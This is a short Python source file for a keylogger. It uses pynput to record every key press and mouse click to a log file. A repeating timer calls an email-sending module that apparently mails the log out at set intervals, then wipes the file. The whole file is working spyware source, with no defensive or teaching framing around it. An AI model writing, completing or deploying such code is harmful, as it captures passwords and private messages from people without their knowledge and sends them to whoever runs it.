import os 
import pynput 
import data
import threading
import email_send

log_file = os.environ.get(
	'pylogger_file', 
	os.path.expanduser(data.path) 
) 

if not os.path.exists(log_file):
  		open(log_file, 'w').close()

def email_threading():
	email_send.send_data()
	
	if os.path.exists(log_file):
  		open(log_file, 'w').close()
	t = threading.Timer(data.time_seconds, email_threading)
	t.start()

email_threading()

def OnKeyPress(key): 
	with open(log_file, 'a') as f: 
		f.write(f"{key} \n")

def OnKeyRelease(key):
	pass

def OnMouseClick(x, y, button, pressed):
	if pressed:
		with open(log_file, 'a') as f: 
			f.write(f"Click\n")

def OnScroll(x,y,dx,dy):
	pass

def OnMove(x,y):
	pass

with pynput.mouse.Listener(on_move=OnMove, on_click=OnMouseClick, on_scroll=OnScroll) as listener:
	with pynput.keyboard.Listener(on_press = OnKeyPress, 
			  on_release = OnKeyRelease) as listener: 
		listener.join()


